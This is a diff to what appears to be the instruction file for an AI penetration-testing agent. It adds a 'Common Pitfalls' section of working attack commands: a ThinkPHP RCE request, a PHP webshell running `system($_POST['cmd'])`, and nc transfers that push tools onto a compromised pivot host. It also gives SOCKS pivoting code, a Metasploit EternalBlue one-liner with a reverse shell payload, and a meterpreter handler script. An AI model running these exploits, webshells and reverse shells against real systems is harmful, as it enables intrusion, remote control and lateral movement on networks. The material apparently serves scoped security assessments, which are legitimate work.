@@ -65,6 +65,8 @@ Use `list_containers()` if the user asks about available pentesting environments
 3. Read the state of work
 4. Follow the workflow dynamically
 
+> **Note:** When chatting via the AI terminal, the assessment is already auto-loaded by the system. Do NOT call `load_assessment` unless you are explicitly switching to a different assessment. If `load_assessment` fails, use `list_assessments()` to find the correct name, then retry.
+
 ## **Assessment Uniqueness**
 
 Each assessment is unique.
@@ -157,3 +159,85 @@ Never classify CRITICAL without confirmed exploitation.
 * If a command times out → stop and notify.
 * If MCP errors → adjust parameters and retry.
 * **Never loop on request formatting** — If a request fails 2 times due to wrong format, missing parameters, unexpected response structure, or authentication issues, STOP and ask the user to provide a working sample request (Burp copy-paste, curl command, or raw HTTP). Do not keep modifying payloads blindly. The user has access to the application and can provide the correct format immediately.
+
+---
+
+# **Common Pitfalls & Solutions**
+
+## IP Addresses in Scripts
+Scripts in `scripts/` may contain hardcoded IPs from previous sessions. **Always replace them with the current target IP from Assessment IP Scopes before running.** Never run a script without verifying its target IP first.
+
+## curl with Special Characters in URLs
+When using curl with URLs containing backslashes (`\`), brackets `[]`, or braces `{}`, always add `-g` / `--globoff` to prevent curl from interpreting them as ranges:
+```bash
+curl -g -s "http://target/index.php?s=/index/\think\app/invokefunction&..."
+```
+
+## Large File Upload to Pivot (no direct access)
+The container cannot be reached by the pivot host directly. Use reverse transfer via nc:
+```bash
+# On pivot (via RCE): listen
+nc -lvp 4444 > /tmp/fscan
+
+# In container: push
+nc -w3 <pivot_ip> 4444 < /home/cx330/.local/bin/fscan
+```
+For very large files (>5MB), split first:
+```bash
+split -b 2M /path/to/file /tmp/chunk_
+# transfer each chunk, then: cat /tmp/chunk_* > /tmp/tool && chmod +x /tmp/tool
+```
+
+## proxychains4 Not Available
+Use Python with PySocks instead:
+```python
+import socks, socket
+socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 1080)
+socket.socket = socks.socksocket
+# then use requests/impacket normally
+```
+Or prefix commands with `proxychains4` only if installed; otherwise use `python3 -c` with socks directly.
+
+## PHP Webshell Output Parsing
+When RCE output is wrapped in ThinkPHP/framework HTML error pages, extract the actual output:
+```bash
+# Pipe through grep to strip HTML
+curl -s ... | grep -oP '(?<=<br />).*?(?=<br />)' | head -5
+# Or use python to strip tags
+curl -s ... | python3 -c "import sys,re; print(re.sub('<[^>]+>','',sys.stdin.read()))"
+```
+Use `echo "STARTMARK"; <cmd>; echo "ENDMARK"` as delimiters and grep between them.
+
+## PHP eval() Webshell
+Never use `echo __S__` as separator — PHP treats `__S__` as an undefined constant. Use string literals:
+```php
+// Bad:  echo __S__;
+// Good: echo "MARK_START";
+system($_POST['cmd']);
+echo "MARK_END";
+```
+
+## Metasploit (msfconsole) Usage
+`msfconsole` is available but **interactive mode will time out**. Always use non-interactive one-liners:
+```bash
+# Run a single module non-interactively
+msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS <target>; set LHOST <container_ip>; set PAYLOAD windows/x64/shell_reverse_tcp; run; exit"
+
+# Run from a resource script (preferred for multi-step)
+cat > /tmp/msf.rc << 'EOF'
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 4444
+run -j
+EOF
+msfconsole -q -r /tmp/msf.rc
+```
+**Rules:**
+- Never run `msfconsole` without `-x "...; exit"` or `-r script.rc` — it will block waiting for input and time out.
+- Always append `; exit` at the end of `-x` commands.
+- For listeners, use `run -j` (background job) then `exit -y` so msfconsole exits after starting the handler.
+- If output is too long, pipe through `tail -50` or redirect to a file and `cat` the last lines.
+
+## Container Network Isolation
+The pentest container IP (e.g. `172.19.0.2`) is not reachable from external pivot hosts. Always use **reverse connections** (pivot connects back to container) or relay through the backend. Never try to start an HTTP server in the container and expect the pivot to fetch from it.
